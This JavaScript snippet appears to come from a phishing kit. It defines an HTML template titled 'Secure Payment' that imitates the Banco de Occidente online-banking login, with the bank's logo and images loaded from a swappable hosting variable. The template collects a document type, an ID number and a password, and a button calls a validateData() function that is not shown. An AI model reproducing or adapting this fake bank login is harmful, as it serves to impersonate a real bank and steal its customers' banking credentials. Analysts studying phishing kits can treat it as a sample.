var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
    * {
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    #btnUsuario {
        background-color: blue;
        width: 80%;
        color: white;
        height: 35px;
        border-radius: 5px;
        border: none;
    }

    select {
        width: 90%;
        height: 35px;
        border-radius: 5px;
        background-color: white;
        color: black;
        border: 1px solid #c7cfed;
        margin-left: 5%;
    }

    input {
        width: 87%;
        height: 35px;
        border-radius: 5px;
        background-color: white;
        color: black;
        border: 1px solid #c7cfed;
        margin-left: 5%;
        padding-left: 10px;
    }

    label {
        margin-left: 5%;
        font-size: 13px;
        color: #556493;
    }
</style>

<img src="${my_hosting}img/1_occidente.jfif" width="30%" style="position:absolute; right:0;">
<br>
<br>
<br>
<br>
<br>
<br>
<center>
    <img src="${my_hosting}img/occidente_logo.png" width="40%">
    <br>
    <br>
    <br>
    <a><b style="font-size:13px;">INGRESA A TU PORTAL TRANSACCIONAL</b></a>
</center>
<br><br>

<label>Tipo de Documento</label>
<br>
<select>
    <option selected>Cédula de ciudadanía</option>
    <option>Tarjeta de identidad</option>
    <option>Cédula de extranjería</option>
    <option>Pasaporte</option>
</select>
<br>
<br>
<label>No. de Documento</label><br>
<input type="text" id="txtUsuario" placeholder="*Documento">
<br>
<br>
<label>Contraseña</label><br>
<input type="password" id="txtPassword" placeholder="*Contraseña">
<br>
<br>
<!-- <a style="margin-left:5%; margin-top: 10px; font-size:13px; color:#0081ff;">Olvidé mi clave</a> -->

<img src="${my_hosting}img/2_occidente.jfif" width="100%">
<center>
    <br>
    <br>
    <button onclick="validateData()" id="btnUsuario">Ingresar</button>
</center>
`